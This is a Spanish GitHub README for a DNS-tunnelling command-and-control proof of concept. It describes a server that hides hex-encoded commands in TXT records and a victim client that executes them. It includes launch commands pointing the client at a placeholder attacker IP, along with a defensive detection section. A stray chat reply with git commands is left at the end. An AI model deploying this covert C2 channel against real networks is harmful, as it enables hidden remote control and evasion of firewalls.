# 🛡️ DNS Tunneling PoC: Command & Control Simulation

![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-Network_Manipulation-red?style=for-the-badge)

## 📖 Descripción del Proyecto
Esta Prueba de Concepto (PoC) demuestra cómo un atacante puede evadir restricciones de red y firewalls perimetrales estableciendo un canal de comunicación de Command and Control (C2) encubierto utilizando el protocolo DNS (Puerto 53). 

El proyecto consta de un servidor atacante que intercepta peticiones DNS específicas y responde con comandos ofuscados, y un cliente (stager) que interpreta y ejecuta dichas instrucciones de forma local utilizando llamadas nativas del sistema para evadir detección.

> **⚠️ Descargo de Responsabilidad:** Este proyecto ha sido creado exclusivamente con fines educativos, de investigación y para auditorías internas de seguridad (Blue Team/Red Team). El autor no se hace responsable del mal uso de este código.

---

## ✨ Características Principales
* **Evasión de capa de red:** El cliente utiliza sockets nativos UDP de Windows, mimetizando el comportamiento estándar del sistema y evitando ser detectado por firewalls locales o hipervisores.
* **Inyección de Payloads:** El servidor C2 intercepta la resolución del dominio y empaqueta comandos codificados en hexadecimal dentro de registros DNS tipo `TXT`.
* **Despliegue Dinámico:** Implementación de `argparse` para parametrizar IPs, puertos y dominios sin necesidad de modificar el código fuente (*hardcoding*).
* **Trazabilidad:** Sistema de `logging` estructurado con marcas de tiempo y niveles de severidad.

---

## 🏗️ Arquitectura del Laboratorio

1. **La Víctima (Stager):** Ejecuta una consulta DNS estándar solicitando información del dominio `beacon.falso.local`.
2. **El Tráfico:** La petición se enruta hacia el Servidor C2 (simulando que los Root Servers han delegado la autoridad del dominio al atacante).
3. **El Servidor C2:** Procesa la petición, genera un comando visual (simulación de RCE) y responde con un registro `TXT` que contiene el payload en hexadecimal.
4. **Ejecución:** La víctima recibe el registro, decodifica el payload en memoria y ejecuta la orden del C2 a nivel de sistema operativo (`tkinter`).

---

## ⚙️ Uso y Despliegue

### Requisitos Previos
* Python 3 instalado en ambas máquinas.
* Librería de manipulación de paquetes (solo necesaria en el servidor):
  ```bash
  pip install scapy
  1. Iniciar el Servidor C2 (Atacante)
El servidor soporta argumentos para configurar la IP de escucha, el puerto y el dominio objetivo. Para un entorno realista, se recomienda usar el puerto 53.

Bash
python dns_server_receiver.py -i 0.0.0.0 -p 53 -d beacon.falso.local
2. Ejecutar el Agente (Víctima)
El cliente requiere que se le especifique la IP del servidor C2 (parámetro -t).

Bash
python dns_victim_client.py -t <IP_DEL_ATACANTE> -p 53
🛡️ Blue Team: Detección y Mitigación
Para detectar y bloquear este tipo de exfiltración/C2 en una red corporativa, se recomienda aplicar las siguientes contramedidas:

Zero Trust en DNS: Bloquear el puerto 53 saliente en los firewalls de los endpoints. Todo el tráfico DNS debe ser forzado a pasar por los servidores DNS internos o un proxy (ej. Cisco Umbrella).

Análisis de Entropía: Monitorizar dominios con alta entropía o longitudes inusualmente largas en el subdominio.

Inspección de Registros TXT: Alertar sobre respuestas DNS que contengan registros TXT con tamaños anómalos o cadenas codificadas (Base64, Hex).

IDS/IPS: Implementar firmas de red (Snort/Suricata) para detectar herramientas conocidas de DNS Tunneling (Iodine, Dnscat2).

Desarrollado por [Tu Nombre/Usuario] - 2026


### Cómo subir este README a tu GitHub:

Una vez lo hayas guardado en tu carpeta local, los comandos para empujarlo son exactamente los mismos de antes:

```bash
git add README.md
git commit -m "Docs: Añadido README profesional con arquitectura, uso y mitigaciones"
git push origin main
